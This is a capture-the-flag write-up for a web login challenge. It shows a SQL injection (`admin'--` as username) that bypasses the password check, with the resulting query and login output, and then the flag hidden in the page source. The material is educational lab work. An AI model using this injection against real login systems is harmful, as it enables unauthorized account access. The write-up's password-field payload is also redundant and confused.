# Hints
***admin*** is the user you want to login as.

# Solution
We know from the hint that ***admin*** is the user we want to login as. Therefore, we need to look
at how the query works when we enter a password. Lets try `password` for the password:

```js
username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'

Login failed.
```

So the query is `SELECT * FROM users WHERE name=' ' AND password=' '`

It simply takes the username and password and queries that from the stored database. We can bypass the password check by
an SQL injection. We can enter `admin'--` as the username and then inject the password with `SELECT username, password FROM users WHERE username='admin'--`

Doing this bypasses the password and we get this:

```js
username: admin'--
password: SELECT username, password FROM users WHERE username='admin'--
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='SELECT username, password FROM users WHERE username='admin'--'

Logged in! But can you see the flag, it is in plainsight.
```

From here, we can inspect the page using `ctrl` + `shift` + `i` and see the flag under the "Elements" tab in a hidden paragraph
